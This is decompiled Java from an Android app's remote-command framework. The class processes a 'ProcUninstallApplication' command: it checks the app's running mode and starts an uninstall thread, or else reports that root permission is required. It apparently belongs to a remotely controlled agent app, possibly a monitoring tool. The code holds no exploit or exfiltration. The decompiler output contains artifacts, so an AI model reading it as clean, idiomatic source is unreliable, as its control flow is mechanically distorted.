package com.vvt.remotecommand.processor.a;

import com.vvt.base.RunningMode;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.exception.RequiresRootException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import java.util.ArrayList;

public class d
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public d(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    int i = ((ArrayList)localObject1).size();
    if (i != 0)
    {
      localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject1).<init>();
      throw ((Throwable)localObject1);
    }
    boolean bool2 = a;
    if (bool2) {}
    Object localObject2 = h();
    localObject1 = new com/vvt/remotecontrol/ControlCommand;
    Object localObject3 = RemoteFunction.DEBUG_GET_APPLICATION_MODE;
    ((ControlCommand)localObject1).<init>((RemoteFunction)localObject3, null);
    localObject1 = (RunningMode)((com.vvt.remotecontrol.a)localObject2).execute((ControlCommand)localObject1);
    localObject3 = RunningMode.LIMITED_1;
    if (localObject1 != localObject3)
    {
      localObject3 = RunningMode.FULL;
      if (localObject1 != localObject3) {}
    }
    else
    {
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject3 = "The software is being uninstalled and will restart when complete.";
      ((StringBuilder)localObject1).append((String)localObject3);
      if (paramc != null)
      {
        localObject1 = ((StringBuilder)localObject1).toString();
        paramc.a(paramRemoteCommand, this, (String)localObject1);
      }
      localObject1 = new java/lang/Thread;
      localObject3 = new com/vvt/remotecommand/processor/a/e;
      ((e)localObject3).<init>(this, (com.vvt.remotecontrol.a)localObject2, paramc, paramRemoteCommand);
      localObject2 = "UninstallThread";
      ((Thread)localObject1).<init>((Runnable)localObject3, (String)localObject2);
      ((Thread)localObject1).start();
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return;
      if (paramc != null)
      {
        localObject1 = new com/vvt/remotecommand/exception/RequiresRootException;
        localObject2 = "This feature requires root permission.";
        ((RequiresRootException)localObject1).<init>((String)localObject2);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
      }
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcUninstallApplication";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */